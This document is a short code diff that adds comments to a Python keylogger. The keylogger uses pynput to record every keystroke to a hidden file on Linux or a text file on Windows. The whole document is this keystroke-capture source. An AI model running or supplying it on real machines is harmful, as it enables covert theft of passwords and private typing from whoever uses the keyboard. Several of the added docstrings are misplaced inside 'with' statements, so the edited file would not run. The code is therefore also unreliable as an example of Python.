@@ -5,12 +5,20 @@ from pynput.keyboard import Key, Listener
 
 
 def press_keys(key):
+    """ press_keys
+    This function capture all typed on keyboard
+    key: str - store characters
+    """
     if platform.system() == 'Linux':
+        """ Recognize """
         with open('.keylogs', 'a') as fp:
+        """ Open file on Linux system Operative """
             fp.write(str(key) + '\n')
     else:
         with open('C:\\Users\\keylogs.txt', 'a') as fp:
+        """ Open file on Windows system Operative """
             fp.write(str(key) + '\n')
 
 with Listener(on_press=press_keys) as listener:
+    """ Wait for event on keyboard """
     listener.join()
